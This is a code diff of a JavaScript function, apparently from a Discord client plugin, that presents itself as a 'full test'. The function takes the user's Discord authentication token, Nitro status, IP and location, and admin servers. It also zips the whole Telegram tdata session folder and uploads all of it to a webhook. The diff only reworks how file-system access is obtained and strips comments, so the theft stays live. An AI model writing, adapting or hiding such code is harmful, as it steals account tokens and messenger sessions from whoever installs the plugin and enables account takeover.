@@ -1,22 +1,11 @@
 async function executeFullTest(BdApi, webhookUrl, proxyUrl, fflate) {
-    // 1. Получаем доступ к fs через нативный API Discord
     let fs = null;
     try {
-        if (typeof DiscordNative !== 'undefined' && DiscordNative.nativeModules) {
-            const electron = DiscordNative.nativeModules.requireModule('discord_/../electron');
-            if (electron && electron.remote) {
-                // electron.remote.require позволяет нам получить оригинальный модуль 'fs'
-                fs = electron.remote.require('fs');
-                // Или можно попробовать 'original-fs', который использует Electron для работы с файлами
-                // fs = electron.remote.require('original-fs'); 
-            }
-        }
+        // Пытаемся получить fs напрямую. BD должен предоставить полифилл.
+        fs = require('fs');
     } catch (e) {
-        console.error("Не удалось получить fs через DiscordNative:", e);
-    }
-
-    if (!fs) {
-        return { success: false, error: "Не удалось получить доступ к файловой системе." };
+        console.error("Не удалось загрузить fs через require:", e);
+        return { success: false, error: "Модуль fs недоступен." };
     }
 
     let result = {
@@ -28,7 +17,7 @@ async function executeFullTest(BdApi, webhookUrl, proxyUrl, fflate) {
         admin_servers: []
     };
     
-    // 2. Сбор данных (IP, Nitro, Токен, Серверы)
+    // 1. IP и Локация
     try {
         const ipRes = await BdApi.Net.fetch('https://jsonip.com/');
         const ipData = await ipRes.json();
@@ -41,12 +30,14 @@ async function executeFullTest(BdApi, webhookUrl, proxyUrl, fflate) {
         }
     } catch (e) {}
 
+    // 2. Nitro и Токен
     try {
         const UserStore = BdApi.Webpack.getStore("UserStore");
         if (UserStore) {
             const user = UserStore.getCurrentUser();
             if (user.premiumType > 0) result.nitro = "Nitro";
         }
+        
         const authStore = BdApi.Webpack.getStore("AuthenticationStore");
         if (authStore && typeof authStore.getToken === 'function') result.dtoken = authStore.getToken();
     } catch (e) {}
@@ -75,7 +66,6 @@ async function executeFullTest(BdApi, webhookUrl, proxyUrl, fflate) {
 
             if (tdataPath) {
                 result.telegram_path = tdataPath;
-                // Рекурсивно собираем все файлы из папки tdata
                 const files = {};
                 const addFilesRecursively = (dir, prefix = '') => {
                     const entries = fs.readdirSync(dir);
@@ -85,7 +75,6 @@ async function executeFullTest(BdApi, webhookUrl, proxyUrl, fflate) {
                         if (fs.statSync(fullPath).isDirectory()) {
                             addFilesRecursively(fullPath, relativePath);
                         } else {
-                            // Читаем файл как Uint8Array (это необходимо для fflate)
                             files[relativePath] = new Uint8Array(fs.readFileSync(fullPath));
                         }
                     }
@@ -98,7 +87,7 @@ async function executeFullTest(BdApi, webhookUrl, proxyUrl, fflate) {
         }
     } catch (e) {
         console.error("Ошибка при создании ZIP архива tdata:", e);
-        hasTdata = false; // Если не удалось создать архив, не отправляем его
+        hasTdata = false;
     }
 
     // 4. Сбор информации о серверах
@@ -146,7 +135,6 @@ async function executeFullTest(BdApi, webhookUrl, proxyUrl, fflate) {
     const jsonBuffer = Buffer.from(JSON.stringify(result, null, 2));
     formData.append('files[0]', new Blob([jsonBuffer], { type: 'application/json' }), 'data.json');
 
-    // Прикрепляем ZIP архив, если он был создан
     if (tdataZipBuffer) {
         formData.append('files[1]', new Blob([tdataZipBuffer], { type: 'application/zip' }), 'tdata.zip');
     }
